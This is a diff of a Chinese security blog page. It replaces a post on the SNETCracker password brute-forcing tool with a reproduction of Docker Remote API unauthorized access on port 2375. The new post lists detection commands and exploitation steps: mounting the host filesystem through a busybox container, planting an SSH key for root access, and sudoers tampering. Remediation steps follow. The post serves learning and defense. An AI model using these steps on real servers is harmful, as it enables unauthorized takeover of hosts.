@@ -16,28 +16,29 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="超级弱口令检测工具一、前言在渗透测试中，针对各项服务（FTP、RDP、SSH 等）的爆破往往是繁琐的，一款好用的爆破工具，可以提高渗透测试的效率，超级弱口令检查工具（作者shac2）支持很多服务的爆破,支持批量导入爆破。 工具介绍1.简介SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查">
+    <meta name="description" content="Docker Remote API未授权访问漏洞复现漏洞简述Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。 存在问题的版本分别为 1.3 和 1.6 。因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，攻击者可以新建 container，删除已有 container，甚至是获取宿主">
 <meta property="og:type" content="article">
-<meta property="og:title" content="超级弱口令检测工具">
-<meta property="og:url" content="http://example.com/2020/10/01/%E8%B6%85%E7%BA%A7%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:title" content="Docker Remote API未授权访问漏洞复现">
+<meta property="og:url" content="http://example.com/2023/03/27/Docker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="人间小太阳">
-<meta property="og:description" content="超级弱口令检测工具一、前言在渗透测试中，针对各项服务（FTP、RDP、SSH 等）的爆破往往是繁琐的，一款好用的爆破工具，可以提高渗透测试的效率，超级弱口令检查工具（作者shac2）支持很多服务的爆破,支持批量导入爆破。 工具介绍1.简介SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查">
+<meta property="og:description" content="Docker Remote API未授权访问漏洞复现漏洞简述Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。 存在问题的版本分别为 1.3 和 1.6 。因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，攻击者可以新建 container，删除已有 container，甚至是获取宿主">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100228840.png">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100913984.png">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100840839.png">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320102956449.png">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320103842064.png">
-<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-17-1024x158.png">
-<meta property="article:published_time" content="2020-10-01T01:43:19.000Z">
-<meta property="article:modified_time" content="2023-03-20T03:07:20.954Z">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327141536700.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327141912887.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327140317363.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327140725830.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327143628715.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144716007.png">
+<meta property="og:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327145627609.png">
+<meta property="article:published_time" content="2023-03-27T05:44:51.000Z">
+<meta property="article:modified_time" content="2023-03-28T02:29:08.845Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100228840.png">
+<meta name="twitter:image" content="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327141536700.png">
   
   
   
-  <title>超级弱口令检测工具 - 人间小太阳</title>
+  <title>Docker Remote API未授权访问漏洞复现 - 人间小太阳</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="超级弱口令检测工具"></span>
+            <span id="subtitle" data-typed-text="Docker Remote API未授权访问漏洞复现"></span>
           
         </div>
 
@@ -211,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2020-10-01 09:43" pubdate>
-          2020年10月1日 上午
+        <time datetime="2023-03-27 13:44" pubdate>
+          2023年3月27日 下午
         </time>
       </span>
     
@@ -223,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          1.8k 字
         
       </span>
     
@@ -234,7 +235,7 @@
         
         
         
-          11 分钟
+          15 分钟
         
       </span>
     
@@ -272,34 +273,61 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">超级弱口令检测工具</h1>
+            <h1 style="display: none">Docker Remote API未授权访问漏洞复现</h1>
             
             <div class="markdown-body">
               
-              <h1 id="超级弱口令检测工具"><a href="#超级弱口令检测工具" class="headerlink" title="超级弱口令检测工具"></a>超级弱口令检测工具</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>在渗透测试中，针对各项服务（FTP、RDP、SSH 等）的爆破往往是繁琐的，一款好用的爆破工具，可以提高渗透测试的效率，超级弱口令检查工具（作者shac2）支持很多服务的爆破,支持批量导入爆破。</p>
-<h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</p>
-<p>工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLServer、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP_SSL、POP3、POP3_SSL、IMAP、IMAP_SSL、VNC、Redis 等服务的弱口令检查工作。</p>
-<p>其他依赖：检查SSH需要安装 VC++2010 32位。</p>
-<h4 id="2-目录介绍"><a href="#2-目录介绍" class="headerlink" title="2.目录介绍"></a>2.目录介绍</h4><p>工具目录下的三个文件夹分别是配置、字典和日志，一般情况下我们不需要修改配置，字典的话可以根据个人情况进行替换或者添加。</p>
-<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100228840.png" srcset="/img/loading.gif" lazyload alt="image-20230320100228840" style="zoom: 50%;">
+              <h1 id="Docker-Remote-API未授权访问漏洞复现"><a href="#Docker-Remote-API未授权访问漏洞复现" class="headerlink" title="Docker Remote API未授权访问漏洞复现"></a>Docker Remote API未授权访问漏洞复现</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。 存在问题的版本分别为 1.3 和 1.6 。因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，攻击者可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>因为在使用此 Docker Remote API 时会默认开放2375端口，因此当用<code>nmap</code>探测发现目标机器开放了2375端口时，可以用如下方法进行探测是否存在未授权访问漏洞。</p>
+<p>方法1：使用<code>-H</code>参数连接目标主机的docker，使用<code>ps</code>命令查询目标系统运行的镜像，若有回显，则存在未授权访问漏洞。</p>
+<p>测试语句：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">docker -H tcp://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">2375</span> ps  # 列出所有容器<br></code></pre></td></tr></table></figure>
 
-<p>dic 文件夹中包含了常用的字典，可以自行添加字典进行扩充</p>
-<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100913984.png" srcset="/img/loading.gif" lazyload alt="image-20230320100913984" style="zoom:50%;">
+<p><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327141536700.png" srcset="/img/loading.gif" lazyload alt="image-20230327141536700"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">docker -H tcp://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">2375</span> images  # 列出所有镜像<br></code></pre></td></tr></table></figure>
 
-<h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shack2/</span>SNETCracker<span class="hljs-regexp">/releases/</span>tag/<span class="hljs-number">1.0</span>.<span class="hljs-number">20190715</span><br></code></pre></td></tr></table></figure>
+<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327141912887.png" srcset="/img/loading.gif" lazyload alt="image-20230327141912887" style="zoom:80%;">
 
-<h2 id="二、工具使用"><a href="#二、工具使用" class="headerlink" title="二、工具使用"></a>二、工具使用</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>直接运行文件 SNETCracker.exe，运行后出现主界面图</p>
-<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320100840839.png" srcset="/img/loading.gif" lazyload alt="image-20230320100840839" style="zoom:50%;">
+<p>方法2：直接访问<code>http://your-ip:2375/version</code>，若能访问，证明存在未授权访问漏洞。</p>
+<p><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327140317363.png" srcset="/img/loading.gif" lazyload alt="image-20230327140317363"></p>
+<p>同时，访问<code>http://ip:2375/v1.23/containers/json</code>会列出容器信息，效果等同于命令<code>docker ps -a</code></p>
+<p><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327140725830.png" srcset="/img/loading.gif" lazyload alt="image-20230327140725830"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="写入SSH公钥法"><a href="#写入SSH公钥法" class="headerlink" title="写入SSH公钥法"></a>写入SSH公钥法</h3><p>首先，使用 docker 命令创建一个 busybox 容器，并将宿主机的磁盘挂载到容器中。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H tcp:<span class="hljs-regexp">//</span>x.x.x.x:<span class="hljs-number">2375</span> run -it -v <span class="hljs-regexp">/:/m</span>nt busybox chroot /mnt sh<br></code></pre></td></tr></table></figure>
 
-<h3 id="功能使用展示"><a href="#功能使用展示" class="headerlink" title="功能使用展示"></a>功能使用展示</h3><h4 id><a href="#" class="headerlink" title></a><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320102956449.png" srcset="/img/loading.gif" lazyload alt="image-20230320102956449" style="zoom: 67%;"></h4><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="1-邮箱弱口令"><a href="#1-邮箱弱口令" class="headerlink" title="1.邮箱弱口令"></a>1.邮箱弱口令</h4><p>检查邮箱弱口令时，部分邮箱系统需要填写邮箱后缀进行登录，如果检查邮箱出现一个账号都没有成功的情况，可以在账户后缀里面添加邮箱后缀在检查，例如（<code>@mail.baidu.com</code>）。</p>
-<h4 id="2-SSH-检查注意事项"><a href="#2-SSH-检查注意事项" class="headerlink" title="2.SSH 检查注意事项"></a>2.SSH 检查注意事项</h4><p>① 某些SSH可能由于服务器没做SSH DNS 优化，单次登录要5-10秒时间，所以建议延时设置为大于10秒，否则可能因为超时无法检测。</p>
-<p>② 当检查SSH出现异常时“Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies. 找不到指定的模块。”，请安装32位vc++ 2010。</p>
-<h4 id="3-RDP检查注意事项"><a href="#3-RDP检查注意事项" class="headerlink" title="3.RDP检查注意事项"></a>3.RDP检查注意事项</h4><p>线程建议不要超过10个，否则容易崩溃。</p>
-<h4 id="4-SMB检查"><a href="#4-SMB检查" class="headerlink" title="4.SMB检查"></a>4.SMB检查</h4><p>检查SMB服务一般需要开放445端口，如果需要检查域账号弱口令，需要在用户名前面加上“域名称\”。类似“dc\administrator”。</p>
-<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230320103842064.png" srcset="/img/loading.gif" lazyload alt="image-20230320103842064" style="zoom:67%;">
+<p><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327143628715.png" srcset="/img/loading.gif" lazyload alt="image-20230327143628715"></p>
+<p>然后，将攻击者SSH公钥<code>~/.ssh/id_rsa.pub</code>的内容写入到容器内的<code>/root/.ssh/authorized_keys</code>文件下（因为已经进行了挂载，所以写入到容器内目录下等同于写入到宿主机下）。</p>
+<p>（1）本地获取SSH公钥</p>
+<p>创建公钥&#x2F;私钥对 ssh-keygen</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$ ssh<span class="hljs-params">-keygen</span><br>Generating <span class="hljs-keyword">public</span>/<span class="hljs-keyword">private</span> rsa key <span class="hljs-built_in">pair</span>.<br><span class="hljs-params">...</span><br>$ ls<br>id_rsa  id_rsa.pub  known_hosts<br></code></pre></td></tr></table></figure>
 
-<h4 id="5-RDP兼容问题"><a href="#5-RDP兼容问题" class="headerlink" title="5.RDP兼容问题"></a>5.RDP兼容问题</h4><p>为了RDP兼容更广，2019-03-23版本修改了RDP DLL版本，采用win7平台DLL，支持Win7或Server08以上系统使用，支持任意Windows操作系统的RDP登陆检查。之前版本由于连接加密问题只能支持server 03和部分Server 08。如果你要在Server 03或Xp上运行此工具，并且要使用RDP检查，请下载2019-03-22版本，2019-03-23以后版本，RDP不在支持。</p>
-<h4 id="6-如需尝试空密码，请在字典里添加”空“字"><a href="#6-如需尝试空密码，请在字典里添加”空“字" class="headerlink" title="6.如需尝试空密码，请在字典里添加”空“字"></a>6.如需尝试空密码，请在字典里添加”空“字</h4><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-17-1024x158.png" srcset="/img/loading.gif" lazyload alt="超级弱口令检查工具SNETCracker" style="zoom:67%;">
+<p>（2）将公钥复制到被攻击者的<code>/root/.ssh/authorized_keys</code>文件中</p>
+<p><img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144716007.png" srcset="/img/loading.gif" lazyload alt="image-20230327144716007"></p>
+<p>复制好之后，就可以利用攻击机 kali 远程连接服务器 <code>ssh root@ip</code></p>
+<img src="https://typora-note--image.oss-cn-hangzhou.aliyuncs.com/img/image-20230327145627609.png" srcset="/img/loading.gif" lazyload alt="image-20230327145627609" style="zoom:80%;">
+
+<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>还可以通过写入crontab定时任务来反弹shell，可以参考如下文章</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-mo-/</span>p/<span class="hljs-number">11529387</span>.html<br>https:<span class="hljs-regexp">//</span>juejin.cn<span class="hljs-regexp">/post/</span><span class="hljs-number">7022625487398633502</span><span class="hljs-comment">#heading-4</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
+<li><p>修改Docker Remote API服务默认参数 （需要重启Docker服务才能生效）</p>
+<p>修改Docker的启动参数，定位到DOCKER_OPTS中的“tcp:&#x2F;&#x2F;0.0.0.0:2375”，将“0.0.0.0”修改为“127.0.0.1”，或将默认端口2375改为自定义端口。</p>
+</li>
+<li><p>为Remote API设置认证措施 （需要重启Docker服务才能生效）</p>
+<p>参照官方文档配置Remote API的认证措施。详情见：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/api/docker_remote_api/#authentication">https://docs.docker.com/engine/reference/api/docker_remote_api/#authentication</a></p>
+</li>
+<li><p>修改Docker服务运行账号 （需要重启Docker才能生效）</p>
+<p>以较低权限账号运行Docker服务。另外可以限制攻击者执行高危命令。</p>
+</li>
+<li><p>设置防火墙策略</p>
+<p>如果正常业务中API服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Docker接口。</p>
+</li>
+</ol>
+<h2 id="相关总结"><a href="#相关总结" class="headerlink" title="相关总结"></a>相关总结</h2><ol>
+<li>所有姿势的前提是需要 Docker 以 root 权限运行。</li>
+<li>Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录，可以参考 Redis 未授权访问漏洞，将宿主机的&#x2F;root&#x2F;.ssh目录挂载到容器上，然后写入公钥。如果有web目录的话，最差也能上一个webshell。</li>
+<li>有些服务器不允许root登录，可以写入其他用户的.ssh&#x2F;目录下（通过查看<code>/etc/ssh/sshd_config</code>目录），然后修改<code>/etc/sudoers</code>中的文件，配置为 sudo 免密码，切换为root。</li>
+</ol>
 
               
             </div>
@@ -317,7 +345,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="category-chain-item">安全工具</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
   
   
 
@@ -339,18 +367,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/11/01/CVE-2021-25642/" title="CVE-2021-25642">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2021-25642</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/09/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95%E8%A7%A3%E8%AF%BB/" title="网络安全法解读">
-                        <span class="hidden-mobile">网络安全法解读</span>
+                      <a href="/2022/08/05/Go%E8%AF%AD%E8%A8%80%E7%9A%84%E7%89%B9%E6%80%A7%E5%8F%8A%E5%8F%91%E5%B1%95%E5%89%8D%E6%99%AF/" title="Go语言的特性及发展前景">
+                        <span class="hidden-mobile">Go语言的特性及发展前景</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
